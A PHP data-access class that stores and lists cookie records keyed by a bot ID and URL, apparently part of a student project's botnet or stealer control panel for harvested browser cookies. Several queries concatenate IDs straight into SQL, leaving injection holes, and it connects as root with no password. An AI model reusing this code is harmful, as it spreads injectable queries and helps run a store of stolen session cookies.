<?php
include_once("../Model/Bean/Cookies.php");
class DAO_Cookies
{
    public function addCookies($idbot, $detail, $content)
    {
        $db = new mysqli('localhost', 'root', '', 'pbl4_v2');
        $query = "INSERT INTO cookies(IdBot,Url,CookiesResult) VALUES(?,?,?)";
        $stmt = $db->prepare($query);
        $stmt->bind_param('sss', $idbot, $detail, $content);
        $stmt->execute();
        $db->close();
    }
    public function getListCookies($idbot,$page)
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "Select * from cookies where IdBot = " . $idbot . " ORDER BY Time DESC";
        $offset = $page * 15;
        $sql = $sql . " LIMIT 15 OFFSET " . $offset;
        $rs = mysqli_query($link, $sql);
        $listCookies = array();
        $i = 0;
        while ($row = mysqli_fetch_array($rs)) {
            $IdCookies = $row['IdCookies'];
            $IdBot = $row['IdBot'];
            $Time = $row['Time'];
            $Url = $row['Url'];
            $CookiesResult = $row['CookiesResult'];
            $listCookies[$i++] = new Cookies($IdCookies, $IdBot, $Time, $Url, $CookiesResult);
        }
        return $listCookies;
    }
    public function getCountListCookies($idbot)
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "Select * from cookies where IdBot = " . $idbot . " ORDER BY Time DESC";
       
        $rs = mysqli_query($link, $sql);
       
        $i = 0;
        $count = 0 ;
        while ($row = mysqli_fetch_array($rs)) {
            $count++;
        }
        return $count;
    }
    public function getCookiesDetail($idCookies)
    {
        $link = mysqli_connect("localhost", "root", "") or die("Khong the ket noi den CSDL MYSQL");
        mysqli_select_db($link, "pbl4_v2");
        $sql = "Select * from cookies where IdCookies = " . $idCookies;
        $rs = mysqli_query($link, $sql);
        while ($row = mysqli_fetch_array($rs)) {
            $IdCookies = $row['IdCookies'];
            $IdBot = $row['IdBot'];
            $Time = $row['Time'];
            $Url = $row['Url'];
            $CookiesResult = $row['CookiesResult'];
            return new Cookies($IdCookies, $IdBot, $Time, $Url, $CookiesResult);
        }
    }
}
